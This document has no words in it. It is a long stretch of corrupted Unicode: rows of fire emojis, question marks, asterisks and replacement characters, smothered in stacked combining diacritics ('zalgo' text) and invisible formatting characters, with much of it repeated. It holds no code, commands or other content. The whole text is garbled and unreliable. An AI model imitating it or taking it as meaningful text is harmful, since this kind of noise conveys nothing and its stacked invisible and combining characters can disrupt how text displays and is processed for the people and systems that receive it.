̨̙͙̞̙͓⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̛̛͛́̿́͐̾̀̇̊̽͒̕̕̚̕̚